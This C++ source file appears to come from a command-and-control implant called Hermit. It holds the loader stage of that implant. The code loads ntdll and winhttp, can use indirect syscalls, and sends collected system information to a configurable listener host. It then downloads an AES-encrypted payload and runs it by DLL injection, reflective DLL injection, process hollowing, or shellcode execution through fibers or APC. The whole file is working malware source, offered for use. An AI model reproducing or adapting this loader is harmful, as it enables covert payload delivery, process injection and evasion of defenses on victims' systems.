#include "hermit.hpp"

namespace Hermit
{
    State::PSTATE Init()
    {
        // Load modules for dynamac API resolution.
        HMODULE hNTDLL = LoadLibrary(L"ntdll.dll");
        if (!hNTDLL)
        {
			return nullptr;
        }

        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
        if (!hWinHTTPDLL)
        {
			FreeLibrary(hNTDLL);
            return nullptr;
        }
    
        State::PSTATE pState = new State::STATE;

        #ifdef PAYLOAD_INDIRECT_SYSCALLS
		pState->bIndirectSyscalls	        = TRUE;
        #else
        pState->bIndirectSyscalls           = FALSE;
        #endif

		pState->pCrypt				        = Crypt::InitCrypt(AES_KEY_BASE64_W, AES_IV_BASE64_W);
		// pState->pTeb 				        = NtCurrentTeb();
		pState->hNTDLL				        = hNTDLL;
		pState->hWinHTTPDLL			        = hWinHTTPDLL;
		pState->pProcs 				        = Procs::FindProcs(hNTDLL, hWinHTTPDLL, pState->bIndirectSyscalls);
		pState->lpPayloadType 		        = PAYLOAD_TYPE_W;
		pState->lpPayloadTechnique 		    = PAYLOAD_TECHNIQUE_W;
        pState->lpPayloadProcessToInject    = PAYLOAD_PROCESS_TO_INJECT_W;
		pState->lpListenerProto 	        = LISTENER_PROTOCOL_W;
		pState->lpListenerHost 		        = LISTENER_HOST_W;
		pState->nListenerPort 		        = LISTENER_PORT;
		pState->lpReqPathDownload 	        = REQUEST_PATH_DOWNLOAD_W;
		pState->hSession 			        = nullptr;
		pState->hConnect 			        = nullptr;
		pState->hRequest 			        = nullptr;
		// pState->pSocket 			        = nullptr;

		// Get system information
		Handler::GetInitialInfoJSON(pState);

		Handler::HTTPInit(pState);
		if (pState->hSession == nullptr || pState->hConnect == nullptr)
		{
			State::Free(pState);
			return nullptr;
		}

        return pState;
    }

    std::vector<BYTE> Download(State::PSTATE pState)
    {
        std::string sInfoJSON = Utils::Convert::UTF8Encode(std::wstring(pState->lpInfoJSON));

        System::Http::WinHttpResponse resp = System::Http::RequestSend(
            pState->pProcs,
            pState->hConnect,
            pState->lpListenerHost,
            pState->nListenerPort,
            pState->lpReqPathDownload,
            L"POST",
            L"Content-Type: application/json\r\n",
            (LPVOID)sInfoJSON.c_str(),
            (DWORD)strlen(sInfoJSON.c_str())
        );
        if (!resp.bResult || resp.dwStatusCode != 200)
        {
            return std::vector<BYTE>();
        }

        std::wstring wEnc = System::Http::ResponseRead(pState->pProcs, resp.hRequest);
        if (wEnc.length() == 0)
        {
            return std::vector<BYTE>();
        }

        // Decrypt the data
        std::vector<BYTE> bytes = Crypt::Decrypt(wEnc, pState->pCrypt->pAES->hKey, pState->pCrypt->pAES->iv);
        return bytes;
    }

    VOID DLLLoader()
    {        
        State::PSTATE pState = Init();
        if (!pState)
            return;

        // Download DLL
        std::vector<BYTE> bytes = Download(pState);
        if (bytes.empty())
        {
            State::Free(pState);
            return;
        }

        // Target PID to be injected DLL.
        DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);

        // Inject DLL
        if (wcscmp(pState->lpPayloadTechnique, L"dll-injection") == 0)
        {
            Technique::Injection::DLLInjection(pState->pProcs, dwTargetPID, bytes);
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"reflective-dll-injection") == 0)
        {
            Technique::Injection::ReflectiveDLLInjection(pState->pProcs, dwTargetPID, bytes);
        }

        State::Free(pState);
        return;
    }

    VOID PELoader()
    {
        State::PSTATE pState = Init();
        if (!pState)
            return;

        // Download PE
        std::vector<BYTE> bytes = Download(pState);
        if (bytes.empty())
        {
            State::Free(pState);
            return;
        }

        // Inject PE
        if (wcscmp(pState->lpPayloadTechnique, L"direct-execution") == 0)
        {
            Technique::Injection::DirectExecution(pState->pProcs, bytes);
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"process-hollowing") == 0)
        {
            Technique::Injection::ProcessHollowing(
                pState->pProcs,
                (LPVOID)bytes.data(),
                pState->lpPayloadProcessToInject
            );
        }

        State::Free(pState);
        return;
    }

    VOID ShellcodeLoader()
    {
        State::PSTATE pState = Init();
        if (!pState)
            return;

        // Download shellcode
        std::vector<BYTE> bytes = Download(pState);
        if (bytes.empty())
        {
            State::Free(pState);
            return;
        }

        // Inject shellcode
        if (wcscmp(pState->lpPayloadTechnique, L"shellcode-injection") == 0)
        {
            DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
            Technique::Injection::ShellcodeInjection(pState->pProcs, dwTargetPID, bytes);
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"shellcode-execution-via-fibers") == 0)
        {
            Technique::Injection::ShellcodeExecutionViaFibers(pState->pProcs, bytes);
        }
        else if (wcscmp(pState->lpPayloadTechnique, L"shellcode-execution-via-apc-and-nttestalert") == 0)
        {
            Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(pState->pProcs, bytes);
        }

        State::Free(pState);
        return;
    }
}
